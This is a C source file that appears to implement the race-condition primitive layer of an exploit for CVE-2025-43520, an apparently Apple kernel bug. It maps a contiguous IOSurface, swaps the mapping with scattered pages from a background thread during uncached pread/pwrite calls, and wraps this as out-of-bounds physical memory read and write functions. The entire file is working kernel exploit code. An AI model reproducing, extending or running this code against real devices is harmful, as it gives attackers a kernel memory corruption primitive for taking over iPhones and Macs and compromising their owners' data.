// ds_race.c — CVE-2025-43520 primitive layer
//
// two mappings share the racing VA:
//   A = IOSurface in PurpleGfxMem  (physically contiguous, first check passes)
//   B = anonymous mach_vm_map      (physically scattered, what we actually want the
//                                   kernel to drive I/O against)
//
// per attempt: region is A, we fire the syscall, and the swapper thread overwrites
// region with B inside the window between cluster_io_type() and
// cluster_write_contig()'s second vm_map_get_upl(). after the syscall returns we
// put A back and try again. thousands of attempts per second are normal.
#include "ds_race.h"
#include "ds_log.h"

#include "iosurface_compat.h"
#include <mach/mach_vm.h>
#include <mach/vm_map.h>
#include <pthread.h>
#include <sched.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <sys/uio.h>

static int ds_map_contig_ioregion(ds_race_ctx *c, size_t size) {
    CFMutableDictionaryRef props = CFDictionaryCreateMutable(
        kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    long alloc_size = (long)size;
    CFNumberRef n = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &alloc_size);
    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), n);
    CFDictionarySetValue(props, CFSTR("IOSurfaceMemoryRegion"), CFSTR("PurpleGfxMem"));
    CFRelease(n);

    IOSurfaceRef surface = IOSurfaceCreate(props);
    CFRelease(props);
    if (!surface) {
        DS_LOG("contig: IOSurfaceCreate(PurpleGfxMem) failed");
        return -1;
    }

    // kIOSurfacePurpleGfxMem surfaces come back CPU-accessible on A-series;
    // the returned base IS the physically contiguous range.
    void *base = IOSurfaceGetBaseAddress(surface);
    if (!base) {
        DS_LOG("contig: PurpleGfxMem surface is not CPU mappable on this device");
        CFRelease(surface);
        return -1;
    }
    c->contig_src = (mach_vm_address_t)base;
    DS_LOG("contig: surface base = 0x%llx size = 0x%zx", (uint64_t)c->contig_src, size);
    // deliberately leaked: the surface must outlive every race attempt
    return 0;
}

// maps the contiguous pages at c->region. tries a named memory entry first
// (aliases the exact physical pages, contiguity preserved), then falls back to a
// same-task mach_vm_remap.
static int ds_region_bind_contig(ds_race_ctx *c) {
    vm_prot_t cur = VM_PROT_READ | VM_PROT_WRITE;
    vm_prot_t max = VM_PROT_READ | VM_PROT_WRITE;
    kern_return_t kr = mach_vm_remap(mach_task_self(), &c->region, DS_RACE_REGION, 0,
                                     VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
                                     mach_task_self(), c->contig_src, FALSE, &cur, &max,
                                     VM_INHERIT_NONE);
    if (kr == KERN_SUCCESS)
        return 0;

    // named-entry path: works when the source pages live in a normal vm object
    mach_port_t entry = MACH_PORT_NULL;
    mach_vm_size_t esize = DS_RACE_REGION;
    kr = mach_make_memory_entry_64(mach_task_self(), &esize, c->contig_src,
                                   VM_PROT_READ | VM_PROT_WRITE, &entry, MACH_PORT_NULL);
    if (kr != KERN_SUCCESS || entry == MACH_PORT_NULL) {
        DS_LOG("contig: remap and memory-entry both failed (kr=%d)", kr);
        return -1;
    }
    kr = mach_vm_map(mach_task_self(), &c->region, DS_RACE_REGION, 0,
                     VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, entry, 0, FALSE,
                     VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE,
                     VM_INHERIT_NONE);
    mach_port_deallocate(mach_task_self(), entry);
    if (kr != KERN_SUCCESS) {
        DS_LOG("contig: mach_vm_map(entry) failed (kr=%d)", kr);
        return -1;
    }
    return 0;
}

// replaces the region with anonymous scattered pages
static int ds_region_bind_noncontig(ds_race_ctx *c) {
    mach_vm_address_t addr = c->region;
    kern_return_t kr = mach_vm_map(mach_task_self(), &addr, DS_RACE_REGION, 0,
                                   VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, MEMORY_OBJECT_NULL, 0,
                                   TRUE, VM_PROT_READ | VM_PROT_WRITE,
                                   VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
    return kr == KERN_SUCCESS ? 0 : -1;
}

static void ds_race_prepare_region(ds_race_ctx *c) {
    // reserve and immediately release so the VA is ours and FIXED maps have a target
    mach_vm_address_t addr = 0;
    mach_vm_allocate(mach_task_self(), &addr, DS_RACE_REGION, VM_FLAGS_ANYWHERE);
    mach_vm_deallocate(mach_task_self(), addr, DS_RACE_REGION);
    c->region = addr;
}

int ds_race_init(ds_race_ctx *c) {
    memset(c, 0, sizeof(*c));
    c->fd_read = -1;
    c->fd_write = -1;

    char path[512];
    const char *dir = getenv("HOME") ? getenv("HOME") : "/tmp";
    snprintf(path, sizeof(path), "%s//ds_r.bin", dir);
    c->fd_read = open(path, O_RDWR | O_CREAT | O_TRUNC, 0600);
    snprintf(path, sizeof(path), "%s//ds_w.bin", dir);
    c->fd_write = open(path, O_RDWR | O_CREAT | O_TRUNC, 0600);
    if (c->fd_read < 0 || c->fd_write < 0) {
        DS_LOG("open tmp files failed: %s", strerror(errno));
        return -1;
    }
    // without F_NOCACHE the cached copy strategy wins and the contig path never runs
    fcntl(c->fd_read, F_NOCACHE, 1);
    fcntl(c->fd_write, F_NOCACHE, 1);

    unsigned char fill[DS_IOV_TOTAL];
    memset(fill, 0x41, sizeof(fill));
    if (pwrite(c->fd_read, fill, sizeof(fill), 0) != (ssize_t)sizeof(fill)) {
        DS_LOG("seed file failed");
        return -1;
    }

    if (ds_map_contig_ioregion(c, DS_RACE_REGION) < 0) {
        DS_LOG("no contiguous mapping available — exploit cannot proceed on this build");
        return -1;
    }

    ds_race_prepare_region(c);
    if (ds_region_bind_contig(c) < 0)
        return -1;

    c->marker = (uint64_t)arc4random() << 32 | arc4random();
    memcpy((void *)c->region, &c->marker, sizeof(c->marker));

    DS_LOG("race region = 0x%llx contig_src = 0x%llx",
           (uint64_t)c->region, (uint64_t)c->contig_src);
    return 0;
}

int ds_race_contiguous(ds_race_ctx *c) {
    return c->contig_src != 0 && c->region != 0;
}

// shared with the hot path: 1 = syscall in flight, 2 = swap performed
volatile int ds_swap_phase = 0;
static ds_race_ctx *ds_swap_ctx = NULL;

static void *ds_swap_loop(void *arg) {
    (void)arg;
    ds_race_ctx *c = ds_swap_ctx;
    while (!c->stop) {
        if (ds_swap_phase != 1) {
            sched_yield();
            continue;
        }
        // flip the mapping as many times as the syscall stays in flight. a single
        // swap per attempt almost always lands before cluster_io_type() runs; the
        // interesting interleaving is swap-after-first-check, and only rapid
        // alternation gives that a real chance.
        while (ds_swap_phase == 1 && !c->stop) {
            ds_region_bind_noncontig(c);
            if (ds_swap_phase != 1)
                break;
            ds_region_bind_contig(c);
        }
        ds_swap_phase = 2;
    }
    return NULL;
}

static int ds_swapper_start(ds_race_ctx *c) {
    ds_swap_ctx = c;
    ds_swap_phase = 0;
    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
    int rc = pthread_create(&c->remap_thread, &attr, ds_swap_loop, NULL);
    pthread_attr_destroy(&attr);
    if (rc != 0) {
        DS_LOG("swapper thread create failed (%d)", rc);
        return -1;
    }
    return 0;
}

int ds_race_start(ds_race_ctx *c) {
    c->stop = 0;
    if (ds_swapper_start(c) < 0)
        return -1;
    c->remap_active = 1;
    return 0;
}

void ds_race_stop(ds_race_ctx *c) {
    c->stop = 1;
    c->remap_active = 0;
}

// mode: 0 = read adjacent phys page into out, 1 = write out into adjacent phys page
int ds_race_attempt(ds_race_ctx *c, int dir, void *out, uint64_t *attempts_out) {
    (void)out;
    void *va = (void *)(c->region + DS_IOV_OFFSET);
    // restore the contiguous baseline before every try
    if (ds_region_bind_contig(c) < 0)
        return 0;
    memcpy((void *)c->region, &c->marker, sizeof(c->marker));

    ds_swap_phase = 1;
    errno = 0;
    if (dir == 0)
        pwrite(c->fd_write, va, DS_IOV_TOTAL, DS_IOV_OFFSET);   // memory -> file  (phys read)
    else
        pread(c->fd_read, va, DS_IOV_TOTAL, DS_IOV_OFFSET);     // file -> memory  (phys write)
    int saved = errno;
    ds_swap_phase = 2;

    c->attempts++;
    if (attempts_out)
        *attempts_out = c->attempts;

    // EINVAL from the post-loop alignment check is only reachable on the contig path
    if (saved == EINVAL) {
        c->contig_hits++;
        return 1;
    }
    return 0;
}

uint64_t ds_oob_read(ds_race_ctx *c, void *out, uint64_t budget) {
    uint64_t start = c->contig_hits;
    unsigned char scratch[DS_IOV_TOTAL];
    for (uint64_t i = 0; i < budget; i++) {
        if (ds_race_attempt(c, 0, scratch, NULL)) {
            // the syscall already pushed the window into fd_write
            pread(c->fd_write, out, DS_IOV_TOTAL, DS_IOV_OFFSET);
            return c->contig_hits - start;
        }
    }
    return 0;
}

uint64_t ds_oob_write(ds_race_ctx *c, const void *in, uint64_t budget) {
    uint64_t start = c->contig_hits;
    unsigned char page[DS_IOV_TOTAL];
    memset(page, 0, sizeof(page));
    memcpy(page + DS_HEAD_LEN, in, DS_TAIL_LEN);
    pwrite(c->fd_read, page, DS_IOV_TOTAL, DS_IOV_OFFSET);   // pread reads from the same offset

    for (uint64_t i = 0; i < budget; i++) {
        if (ds_race_attempt(c, 1, page, NULL))
            return c->contig_hits - start;
    }
    return 0;
}
